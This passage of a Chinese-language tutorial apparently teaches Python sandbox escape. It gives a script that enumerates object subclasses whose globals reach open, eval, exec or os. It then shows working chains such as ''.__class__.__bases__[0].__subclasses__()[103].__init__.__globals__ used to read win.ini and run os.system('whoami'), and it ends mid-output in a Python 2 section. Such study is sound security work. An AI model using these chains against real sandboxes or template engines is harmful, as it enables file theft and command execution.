language-none"><code class="language-none">asynciocollectionsconcurrentctypescursesdbmdistutilsemailencodings......warnings.pywave.pyweakref.pywebbrowser.pyxdrlib.pyzipapp.pyzipfile.pyzipimport.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将这么模块进行筛选，规则这些模块哪些有调用上面提到的模块，或者文件读取等方法。</p><pre class="line-numbers language-none"><code class="language-none"># coding&#x3D;UTF-8import codecsfrom collections import defaultdictwith codecs.open(&#39;python.txt&#39;, &#39;r&#39;, encoding&#x3D;&#39;UTF-8&#39;) as f:    modules &#x3D; f.readlines()modules &#x3D; [m.strip().replace(&#39;.py&#39;, &#39;&#39;) for m in modules]target_modules &#x3D; [&#39;os&#39;, &#39;platform&#39;, &#39;subprocess&#39;, &#39;timeit&#39;, &#39;importlib&#39;, &#39;codecs&#39;, &#39;sys&#39;, &#39;commands&#39;]target_functions &#x3D; [&#39;__import__&#39;, &#39;__builtins__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;file&#39;, &#39;open&#39;, &#39;codecs&#39;]all_targets &#x3D; target_modules + target_functionsresults &#x3D; defaultdict(list)for m in modules:    try:        module &#x3D; __import__(m)    except Exception as e:        # print(&#39;ERROR:&#39;, m)        pass    for t in all_targets:        if t in module.__dict__:            results[m.encode()].append(t)print(&quot;可利用模块数量为:&quot;+str(len(results)))for k, v in results.items():    print(k, v)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>筛选完成后有python3两百个模块可能可以利用，然后再利用脚本进一步筛选</p><pre class="line-numbers language-none"><code class="language-none">find_modules &#x3D; &#123;    &#125;target_modules &#x3D; [&#39;os&#39;, &#39;platform&#39;, &#39;subprocess&#39;, &#39;timeit&#39;, &#39;importlib&#39;, &#39;codecs&#39;, &#39;sys&#39;]target_functions &#x3D; [&#39;__import__&#39;, &#39;__builtins__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;file&#39;, &#39;open&#39;]all_targets &#x3D; list(set(list(find_modules.keys()) + target_modules + target_functions))all_modules &#x3D; list(set(list(find_modules.keys()) + target_modules))subclasses &#x3D; ().__class__.__bases__[0].__subclasses__()sub_name &#x3D; [s.__name__ for s in subclasses]# 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#39;.&#x2F;test.py&#39;).read()print(&#39;----------1-----------&#39;)for i, s in enumerate(sub_name):    for f in all_targets:        if f &#x3D;&#x3D; s:            if f in target_functions:                print(i, f)            elif f in all_modules:                target &#x3D; find_modules[f]                sub_dict &#x3D; subclasses[i].__dict__                for t in target:                    if t in sub_dict:                        print(i, f, target)print(&#39;----------2-----------&#39;)# 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)for i, sub in enumerate(subclasses):    try:        more &#x3D; sub.__init__.__globals__        for m in all_targets:            if m in more:                print(i, sub, m, find_modules.get(m))    except Exception as e:        passprint(&#39;----------3-----------&#39;)# 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)for i, sub in enumerate(subclasses):    try:        more &#x3D; sub.__init__.__globals__.values()        for j, v in enumerate(more):            for f in all_targets:                try:                    if f in v:                        if f in target_functions:                            print(i, j, sub, f)                        elif f in all_modules:                            target &#x3D; find_modules.get(f)                            sub_dict &#x3D; v[f].__dict__                            for t in target:                                if t in sub_dict:                                    print(i, j, sub, f, target)                except Exception as e:                    pass    except Exception as e:        passprint(&#39;----------4-----------&#39;)# 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)# &lt;class &#39;warnings.catch_warnings&#39;&gt;类很特殊，在内部定义了_module&#x3D;sys.modules[&#39;warnings&#39;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似for i, sub in enumerate(subclasses):    try:        more &#x3D; sub()._module.__builtins__        for f in all_targets:            if f in more:                print(i, f)    except Exception as e:        pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">----------2-----------75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __builtins__ None75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__ None75 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; sys None76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __builtins__ None76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__ None76 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; sys None77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __builtins__ None77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__ None77 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; sys None78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __builtins__ None78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__ None78 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; sys None79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __builtins__ None79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__ None79 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; sys None91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __builtins__ None91 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; sys None92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __builtins__ None92 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; sys None93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __builtins__ None93 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; sys None95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __builtins__ None95 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; sys None103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __builtins__ None103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; sys None103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __builtins__ None104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; sys None104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __builtins__ None105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; sys None105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __builtins__ None106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; sys None106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None128 &lt;class &#39;os._wrap_close&#39;&gt; __builtins__ None128 &lt;class &#39;os._wrap_close&#39;&gt; sys None128 &lt;class &#39;os._wrap_close&#39;&gt; open None129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __builtins__ None129 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; sys None130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __builtins__ None130 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; sys None137 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __builtins__ None138 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __builtins__ None139 &lt;class &#39;warnings.WarningMessage&#39;&gt; __builtins__ None139 &lt;class &#39;warnings.WarningMessage&#39;&gt; sys None140 &lt;class &#39;warnings.catch_warnings&#39;&gt; __builtins__ None140 &lt;class &#39;warnings.catch_warnings&#39;&gt; sys None167 &lt;class &#39;reprlib.Repr&#39;&gt; __builtins__ None174 &lt;class &#39;functools.partialmethod&#39;&gt; __builtins__ None176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __builtins__ None176 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; sys None177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __builtins__ None177 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; sys None----------3-----------75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; eval75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; compile75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; __import__75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; eval76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; compile76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; __import__76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; eval77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; compile77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; __import__77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; eval78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; compile78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; __import__78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; eval79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; compile79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; __import__79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; eval91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; compile91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; __import__91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; eval92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; compile92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; __import__92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; eval93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; compile93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; __import__93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; eval95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; compile95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; __import__95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; eval103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; compile103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; __import__103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; eval104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; compile104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; __import__104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; eval105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; compile105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; __import__105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; eval106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; compile106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; __import__106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec128 1 &lt;class &#39;os._wrap_close&#39;&gt; file128 1 &lt;class &#39;os._wrap_close&#39;&gt; open128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec128 7 &lt;class &#39;os._wrap_close&#39;&gt; eval128 7 &lt;class &#39;os._wrap_close&#39;&gt; compile128 7 &lt;class &#39;os._wrap_close&#39;&gt; __import__128 7 &lt;class &#39;os._wrap_close&#39;&gt; open128 11 &lt;class &#39;os._wrap_close&#39;&gt; open129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; eval129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; compile129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; __import__129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; eval130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; compile130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; __import__130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; eval137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; compile137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; __import__137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; eval138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; compile138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; __import__138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; eval139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; compile139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; __import__139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; eval140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; compile140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; __import__140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec167 7 &lt;class &#39;reprlib.Repr&#39;&gt; eval167 7 &lt;class &#39;reprlib.Repr&#39;&gt; compile167 7 &lt;class &#39;reprlib.Repr&#39;&gt; __import__167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec174 7 &lt;class &#39;functools.partialmethod&#39;&gt; eval174 7 &lt;class &#39;functools.partialmethod&#39;&gt; compile174 7 &lt;class &#39;functools.partialmethod&#39;&gt; __import__174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; eval176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; compile176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; __import__176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; eval177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; compile177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; __import__177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open----------4-----------140 exec140 eval140 compile140 __import__140 open<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>筛选出来的模块还是很多，每个分块中，不用的部分代表利用不同的方式，为了更方便的利用进一步筛选具有更直接利用方式的类，关注再命令执行和读写上</p><pre class="line-numbers language-none"><code class="language-none">----------2-----------                                      103 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open None           104 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open None           105 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open None           106 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open None                128 &lt;class &#39;os._wrap_close&#39;&gt; open None                      ----------3-----------                                      75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; open           75 5 &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt; exec           76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; open      76 5 &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt; exec      77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; open    77 5 &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt; exec    78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; open     78 5 &lt;class &#39;_frozen_importlib._installed_safely&#39;&gt; exec     79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; open            79 5 &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt; exec            91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; open   91 5 &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt; exec   92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; open92 5 &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt; exec93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; open93 5 &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt; exec95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; open   95 5 &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt; exec   103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open              103 7 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; exec              103 56 &lt;class &#39;codecs.IncrementalEncoder&#39;&gt; open             104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open              104 7 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; exec              104 56 &lt;class &#39;codecs.IncrementalDecoder&#39;&gt; open             105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open              105 7 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; exec              105 56 &lt;class &#39;codecs.StreamReaderWriter&#39;&gt; open             106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                   106 7 &lt;class &#39;codecs.StreamRecoder&#39;&gt; exec                   106 56 &lt;class &#39;codecs.StreamRecoder&#39;&gt; open                  128 1 &lt;class &#39;os._wrap_close&#39;&gt; open                         128 1 &lt;class &#39;os._wrap_close&#39;&gt; exec                         128 7 &lt;class &#39;os._wrap_close&#39;&gt; open                         128 7 &lt;class &#39;os._wrap_close&#39;&gt; exec                         128 11 &lt;class &#39;os._wrap_close&#39;&gt; open                        129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; open                  129 7 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; exec                  130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; open                 130 7 &lt;class &#39;_sitebuiltins._Printer&#39;&gt; exec                 137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; open            137 7 &lt;class &#39;types.DynamicClassAttribute&#39;&gt; exec            138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; open                138 7 &lt;class &#39;types._GeneratorWrapper&#39;&gt; exec                139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; open                139 7 &lt;class &#39;warnings.WarningMessage&#39;&gt; exec                140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; open                140 7 &lt;class &#39;warnings.catch_warnings&#39;&gt; exec                167 7 &lt;class &#39;reprlib.Repr&#39;&gt; open                           167 7 &lt;class &#39;reprlib.Repr&#39;&gt; exec                           174 7 &lt;class &#39;functools.partialmethod&#39;&gt; open                174 7 &lt;class &#39;functools.partialmethod&#39;&gt; exec                176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; open176 7 &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt; exec177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; open              177 7 &lt;class &#39;contextlib._BaseExitStack&#39;&gt; exec              ----------4-----------                                      140 open                                                    140 exec                                                    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>既然筛选出来，那么选其中一个利用来读取文件：</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103]&lt;class &#39;codecs.IncrementalEncoder&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>完整执行</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#39;open&#39;](&quot;C:\\windows\\win.ini&quot;).read()&#39;; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI&#x3D;1\nCMCDLLNAME32&#x3D;mapi32.dll\nCMC&#x3D;1\nMAPIX&#x3D;1\nMAPIXVER&#x3D;1.0.0.1\nOLEMessaging&#x3D;1\n[xianshuabao]\nclient_uuid&#x3D;&#123;xxx&#125;\n&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于<code>dict.values</code>不再返回列表，而是返回view，不可索引的对象。</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; &quot;&quot;.__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)misaki\user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><p>python2.7的模块(252)</p><pre class="line-numbers language-none"><code class="language-none">bsddbcompilerctypescurses......webbrowser.pywhichdb.pywsgiref.egg-infoxdrlib.pyxmllib.pyxmlrpclib.pyzipfile.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样利用原代码进行筛选</p><pre class="line-numbers language-none"><code class="language-none">----------1-----------(40, &#39;file&#39;)----------2-----------(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;__builtins__&#39;, None)(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;sys&#39;, None)(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__builtins__&#39;, None)(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;sys&#39;, None)(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])(61, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__builtins__&#39;, None)(62, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__builtins__&#39;, None)(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;__builtins__&#39;, None)(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;sys&#39;, None)(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__builtins__&#39;, None)(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;sys&#39;, None)(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__builtins__&#39;, None)(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;sys&#39;, None)(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__builtins__&#39;, None)(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;sys&#39;, None)(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)----------3-----------(59, 13, &lt;class 